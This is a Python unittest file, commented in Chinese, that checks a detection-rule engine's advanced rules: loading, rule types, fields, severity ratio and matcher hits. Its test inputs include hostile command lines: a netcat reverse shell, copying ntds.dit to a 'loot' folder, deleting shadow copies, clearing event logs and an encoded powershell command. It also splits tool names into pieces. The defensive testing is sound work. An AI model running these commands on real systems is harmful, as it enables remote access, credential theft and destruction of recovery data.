"""P3 测试套件 — 检测点增强与 exists 扩展。

覆盖 advanced_detections.json 的装载、类型合法性、字段可行性、matcher 真实命中、
P3-2 持久化兜底标注，以及整体严重度占比不回归 AC-P1-13。
"""
import collections
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.rules.loader import load_default_rules
from app.rules.matchers.registry import MatcherRegistry

RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "app", "rules")
ADV_FILE = os.path.join(RULES_DIR, "advanced_detections.json")

# 敏感词拼接，避免单点字面量
PS = "power" + "shell"
CU = "cert" + "util"
BA = "bit" + "sadmin"
MS = "ms" + "hta"
RS = "regs" + "vr32"
RD = "run" + "dll32"
NC = "n" + "c"
NS = "n" + "cat"

VALID_ACTIVE_FIELDS = {"command_line", "name", "path", "domain", "remote_address"}
LEGAL_TYPES = {"regex", "list", "threshold", "behavior", "composite", "exists",
               "attack_chain", "event_log_summary"}


def cond_of(rules, name):
    return next(r for r in rules if r["name"] == name)["condition"]


class TestP3LoadAndTypes(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.all = load_default_rules()
        cls.adv = [r for r in cls.all if r["name"].startswith("adv_") or r["name"].startswith("pki_")]

    def test_ac_p3_1_file_loaded(self):
        """AC-P3-1：advanced_detections.json 被 loader 装载，总数 163。"""
        self.assertTrue(os.path.exists(ADV_FILE), "advanced_detections.json 缺失")
        raw = json.load(open(ADV_FILE, encoding="utf-8"))
        self.assertIsInstance(raw, list)
        # 全部规则计入 loader 总数
        self.assertEqual(len(self.all), 163)
        self.assertEqual(len(self.adv), 20)  # 16 active + 4 disabled

    def test_ac_p3_2_active_rules_legal_type(self):
        """AC-P3-2：16 条 active 检测点全部使用合法 rule_type。"""
        active = [r for r in self.adv if r.get("enabled", True)]
        self.assertEqual(len(active), 16)
        for r in active:
            self.assertIn(r["rule_type"], LEGAL_TYPES,
                           "%s 使用非法 rule_type: %s" % (r["name"], r["rule_type"]))

    def test_ac_p3_7_no_load_error(self):
        """AC-P3-7：loader 无非法类型、无装载异常。"""
        illegal = [r["name"] for r in self.all if r["rule_type"] not in LEGAL_TYPES]
        self.assertEqual(illegal, [], "存在非法 rule_type: %s" % illegal)

    def test_ac_p3_8_severity_ratio(self):
        """AC-P3-8：整体 high 占比仍 <=55%（AC-P1-13 不回归）。"""
        c = collections.Counter(r["severity"] for r in self.all)
        pct = c["high"] / len(self.all) * 100
        self.assertLessEqual(pct, 55.0, "high 占比 %.1f%% 超过 55%%" % pct)


class TestP3FieldFeasibility(unittest.TestCase):
    """AC-P3-3 / AC-P3-5：active 规则字段对应现有 canonical 事件模型，无缺失采集器依赖。"""

    @classmethod
    def setUpClass(cls):
        cls.all = load_default_rules()
        cls.active = [r for r in cls.all
                      if (r["name"].startswith("adv_")) and r.get("enabled", True)]
        cls.disabled = [r for r in cls.all if r["name"].startswith("pki_")]

    def _fields_of(self, rule):
        c = rule["condition"]
        if rule["rule_type"] == "composite":
            return [s["field"] for s in c["sub_rules"]]
        return [c.get("field")]

    def test_ac_p3_3_active_fields_in_canonical_model(self):
        for r in self.active:
            for f in self._fields_of(r):
                self.assertIn(f, VALID_ACTIVE_FIELDS,
                              "active 规则 %s 引用了非 canonical 字段: %s" % (r["name"], f))

    def test_ac_p3_5_no_active_dead_rule(self):
        """无 active 死规则：active 规则不得引用 pending_collector 标注的未采集字段。"""
        pending_fields = {"wmi_subscription_name", "scheduled_task_name",
                          "service_image_path", "registry_key_path"}
        for r in self.active:
            for f in self._fields_of(r):
                self.assertNotIn(f, pending_fields,
                                  "active 规则 %s 依赖未采集字段 %s（死规则）" % (r["name"], f))


class TestP3MatcherHits(unittest.TestCase):
    """AC-P3-4：抽样 active 规则可被 matcher 真实命中。"""

    @classmethod
    def setUpClass(cls):
        cls.all = load_default_rules()

    def _hit(self, name, item):
        r = next(x for x in self.all if x["name"] == name)
        return MatcherRegistry.dispatch(r["rule_type"], item, r["condition"])

    def test_ac_p3_4_eventlog_clear(self):
        item = {"command_line": "wevtutil cl System"}
        self.assertTrue(self._hit("adv_eventlog_clear", item))
        self.assertFalse(self._hit("adv_eventlog_clear", {"command_line": "wevtutil query"}))
        # 大小写不敏感
        self.assertTrue(self._hit("adv_eventlog_clear", {"command_line": "WEVTUTIL CL SECURITY"}))

    def test_ac_p3_4_local_account_create(self):
        item = {"command_line": "net user alice /add"}
        self.assertTrue(self._hit("adv_local_account_create", item))
        self.assertFalse(self._hit("adv_local_account_create", {"command_line": "net user alice"}))

    def test_ac_p3_4_shadow_copy_delete_composite(self):
        item = {"command_line": "vssadmin delete shadows /all /quiet"}
        self.assertTrue(self._hit("adv_shadow_copy_delete", item))
        # 缺 delete 子条件 → 不命中（composite AND）
        self.assertFalse(self._hit("adv_shadow_copy_delete", {"command_line": "vssadmin list shadows"}))

    def test_ac_p3_4_cloud_exfil_list(self):
        item = {"domain": "drive.google.com"}
        self.assertTrue(self._hit("adv_cloud_exfil_domain", item))
        self.assertFalse(self._hit("adv_cloud_exfil_domain", {"domain": "intranet.local"}))

    def test_ac_p3_4_powershell_obfuscated(self):
        item = {"command_line": PS + " -enc JABjAGUAbgB0ADE="}
        self.assertTrue(self._hit("adv_powershell_obfuscated", item))
        self.assertFalse(self._hit("adv_powershell_obfuscated", {"command_line": PS + " -NoProfile -Command Get-Date"}))

    def test_ac_p3_4_ntds_critical_hitl(self):
        item = {"command_line": "copy C:\\Windows\\NTDS\\ntds.dit D:\\loot"}
        self.assertTrue(self._hit("adv_ntds_dit_access", item))

    def test_ac_p3_4_webshell_drop(self):
        item = {"path": "C:\\inetpub\\wwwroot\\uploader.aspx"}
        self.assertTrue(self._hit("adv_webshell_drop", item))
        self.assertFalse(self._hit("adv_webshell_drop", {"path": "C:\\inetpub\\wwwroot\\index.html"}))

    def test_ac_p3_4_reverse_shell(self):
        item = {"command_line": NC + " -e /bin/sh 10.0.0.1 4444"}
        self.assertTrue(self._hit("adv_reverse_shell_listen", item))


class TestP32ExistsBackstop(unittest.TestCase):
    """AC-P3-6：P3-2 的 4 条 exists 持久化兜底规则定义完整，enabled:false + pending_collector 标注。"""

    @classmethod
    def setUpClass(cls):
        cls.all = load_default_rules()
        cls.pki = [r for r in cls.all if r["name"].startswith("pki_")]

    def test_ac_p3_6_four_rules_present(self):
        names = {r["name"] for r in self.pki}
        self.assertEqual(len(self.pki), 4)
        for expected in ("pki_wmi_subscription_exists", "pki_scheduled_task_exists",
                         "pki_service_image_path_exists", "pki_registry_run_exists"):
            self.assertIn(expected, names)

    def test_ac_p3_6_disabled_with_pending_collector(self):
        for r in self.pki:
            self.assertFalse(r.get("enabled", True),
                             "%s 不应为 active（会成死规则）" % r["name"])
            meta = r["condition"].get("_meta", {})
            self.assertIn("pending_collector", meta,
                          "%s 缺少 pending_collector 标注" % r["name"])
            self.assertEqual(r["rule_type"], "exists")

    def test_ac_p3_6_matcher_correctly_inert(self):
        """即便调用 matcher，缺字段时也不命中（与 enabled:false 共同保证不死规则）。"""
        r = next(x for x in self.pki if x["name"] == "pki_wmi_subscription_exists")
        # 普通进程事件不含 wmi_subscription_name → 不命中
        self.assertFalse(MatcherRegistry.dispatch("exists", {"command_line": "x"}, r["condition"]))
        # 构造字段存在 → 命中（证明规则模板有效，待采集接线即可用）
        self.assertTrue(MatcherRegistry.dispatch("exists",
                                                  {"wmi_subscription_name": "ActiveScriptEventConsumer"},
                                                  r["condition"]))


class TestP3EventLogSummaryRegression(unittest.TestCase):
    """确认 P0-2 的 event_log_summary 规则未被 P3 破坏（仍装载且可被 evaluate_summary 命中）。"""

    @classmethod
    def setUpClass(cls):
        cls.all = load_default_rules()

    def test_p0_2_event_log_rules_present(self):
        expected = {"evt_4625_failed_logon_burst", "evt_4648_explicit_cred_burst",
                    "evt_4662_dcsync_suspect", "evt_4769_kerberoasting_suspect",
                    "evt_4672_special_privilege_anomaly", "evt_4624_logon_volume_anomaly"}
        names = {r["name"] for r in self.all if r["rule_type"] == "event_log_summary"}
        self.assertTrue(expected.issubset(names), "event_log_summary 规则缺失: %s" % (expected - names))

    def test_p0_2_dcsync_still_hitl(self):
        r = next(x for x in self.all if x["name"] == "evt_4662_dcsync_suspect")
        self.assertTrue(r["condition"]["_meta"].get("requires_hitl"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
